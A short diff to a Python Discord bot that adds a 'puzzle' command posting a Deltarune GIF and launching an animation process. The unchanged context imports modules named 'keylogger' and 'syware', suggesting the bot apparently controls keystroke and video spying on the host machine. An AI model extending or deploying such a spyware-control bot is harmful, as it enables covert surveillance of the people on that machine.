@@ -6,6 +6,8 @@ import os
 import dotenv
 import keylogger as key 
 import syware as video
+from Rouxls.main_rouxls import run_animation
+import multiprocessing
 
 ## Discord ##
 env = dotenv.find_dotenv('Tokkens.env')
@@ -105,6 +107,13 @@ async def die(ctx):
     await ctx.send("Goodbye!")
     exit(1)
 
+@bot.command()
+async def puzzle(ctx):
+    await ctx.send("https://tenor.com/view/rouxls-kaard-rouxls-deltarune-entrance-gif-23640231")
+
+    p = multiprocessing.Process(target=run_animation)
+    p.start()
+    
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.NotOwner):
